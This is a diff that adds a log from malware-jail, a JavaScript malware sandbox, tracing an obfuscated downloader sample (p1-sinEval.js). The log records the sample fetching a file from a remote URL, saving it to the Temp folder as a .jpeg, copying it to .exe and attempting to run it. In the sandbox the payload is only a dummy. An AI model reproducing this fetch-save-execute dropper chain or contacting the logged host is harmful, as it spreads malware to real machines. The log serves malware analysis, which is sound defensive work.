@@ -1,0 +1,101 @@
+10 Sep 20:21:38 - mailware-jail, a malware sandbox ver. 0.15
+10 Sep 20:21:38 - ------------------------
+10 Sep 20:21:38 - Arguments: /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js
+10 Sep 20:21:38 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+10 Sep 20:21:38 - Malware files: /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js
+10 Sep 20:21:38 - Execution timeout set to: 60 seconds
+10 Sep 20:21:38 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 20:21:38 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+10 Sep 20:21:38 - Download from remote server: No
+10 Sep 20:21:39 - ==> Preparing Sandbox environment.
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+10 Sep 20:21:39 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+10 Sep 20:21:39 - ==> Executing malware file(s). =========================================
+10 Sep 20:21:39 -  => Executing: /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js verbosely, reporting silent catches
+10 Sep 20:21:39 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43_p1-sinEval.js
+10 Sep 20:21:39 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43_p1-sinEval.js
+10 Sep 20:21:39 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js'
+10 Sep 20:21:39 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js,xyz'
+10 Sep 20:21:39 - new Function(oCDi, bKmg, bKmg.Open(); bKmg.Type = 1;  bKmg.Write(oCDi); bKmg.Position = 0;) => Function[14]
+10 Sep 20:21:39 - new Function(cWs, eRb, caU, UrGCwSyaQSB, jyau, cWs.open(caU+UrGCwSyaQSB+jyau, eRb, false); cWs.send();) => Function[15]
+10 Sep 20:21:39 - ActiveXObject(MSXML2.XMLHTTP)
+10 Sep 20:21:39 - new MSXML2.XMLHTTP[16]
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].onreadystatechange = (undefined) 'undefined'
+10 Sep 20:21:39 - Calling Function[15](MSXML2.XMLHTTP[16], http://scenetavern.win/support.php?f=1.dat, G, E, T) on sandbox
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].open(GET,http://scenetavern.win/support.php?f=1.dat,false)
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].method = (string) 'GET'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].url = (string) 'http://scenetavern.win/support.php?f=1.dat'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].async = (boolean) 'false'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].send(undefined)
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16] Not sending data, if you want to interact with remote server, set --down
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].status = (number) '200'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].readystate = (number) '4'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].send(undefined) finished
+10 Sep 20:21:39 - Returning: 'undefined'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].status.get() => (number) '200'
+10 Sep 20:21:39 - MSXML2.XMLHTTP[16].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:21:39 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:21:39 - new Scripting.FileSystemObject[17]
+10 Sep 20:21:39 - new DriveObject[18](C:)
+10 Sep 20:21:39 - DriveObject[18](C:).name = (string) 'C:'
+10 Sep 20:21:39 - new Collection[19]
+10 Sep 20:21:39 - Scripting.FileSystemObject[17].GetSpecialFolder(2) => C:\Users\User\AppData\Local\Temp\
+10 Sep 20:21:39 - ActiveXObject(ADODB.Stream)
+10 Sep 20:21:39 - new ADODB_Stream[20]
+10 Sep 20:21:39 - Calling Function[14](MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)) on sandbox
+10 Sep 20:21:39 - ADODB_Stream[20].Open()
+10 Sep 20:21:39 - ADODB_Stream[20].type = (number) '1'
+10 Sep 20:21:39 - ADODB_Stream[20].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:21:39 - ADODB_Stream[20].Write(str) - 11202 bytes
+10 Sep 20:21:39 - ADODB_Stream[20].size = (number) '11202'
+10 Sep 20:21:39 - ADODB_Stream[20].position = (number) '0'
+10 Sep 20:21:39 - Returning: 'undefined'
+10 Sep 20:21:39 - ADODB_Stream[20].SaveToFile(C:\Users\User\AppData\Local\Temp\\wd93217ar.jpeg, 2)
+10 Sep 20:21:39 - ADODB_Stream[20].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:21:39 - ADODB_Stream[20].Close()
+10 Sep 20:21:39 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:21:39 - new Scripting.FileSystemObject[21]
+10 Sep 20:21:39 - new DriveObject[22](C:)
+10 Sep 20:21:39 - DriveObject[22](C:).name = (string) 'C:'
+10 Sep 20:21:39 - new Collection[23]
+10 Sep 20:21:39 - Scripting.FileSystemObject[21].CopyFile(C:\Users\User\AppData\Local\Temp\\wd93217ar.jpeg, C:\Users\User\AppData\Local\Temp\\wd93217ar.exe)
+10 Sep 20:21:39 - >>> Silencing catch TypeError: opYHyyUpap.Run is not a function
+    at BO (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:125:41)
+    at OAY (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:128:2)
+    at nsKhkCIO (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:137:1)
+    at /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:185:16
+    at WPWHF (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:107:11)
+    at XjXSc (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:184:6)
+    at KLFZ (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:161:22)
+    at /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:117:3
+    at KvgoaW (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:18:11)
+    at /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:114:4
+10 Sep 20:21:39 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:21:39 - new Scripting.FileSystemObject[24]
+10 Sep 20:21:39 - new DriveObject[25](C:)
+10 Sep 20:21:39 - DriveObject[25](C:).name = (string) 'C:'
+10 Sep 20:21:39 - new Collection[26]
+10 Sep 20:21:39 - Scripting.FileSystemObject[24].CopyFile(C:\Users\User\AppData\Local\Temp\\wd93217ar.jpeg, C:\Users\User\AppData\Local\Temp\\wd93217ar.exe)
+10 Sep 20:21:39 - >>> Silencing catch TypeError: opYHyyUpap.Run is not a function
+    at BO (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:125:41)
+    at OAY (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:128:2)
+    at nsKhkCIO (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:137:1)
+    at /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:185:16
+    at WPWHF (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:107:11)
+    at XjXSc (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:184:6)
+    at yVgesNA (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:151:7)
+    at KLFZ (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:166:29)
+    at /home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:117:3
+    at KvgoaW (/home/maik/gitHub/TFM/fame/storage/6f8c55b84b41ce1af240359bae6247a2ad4f359729a424ddfbba2a53e99b9c43/p1-sinEval.js:18:11)
+10 Sep 20:21:39 - ==> Cleaning up sandbox.
+10 Sep 20:21:39 - ==> Script execution finished, dumping sandbox environment to a file.
+10 Sep 20:21:39 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 20:21:39 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp__wd93217ar.jpeg
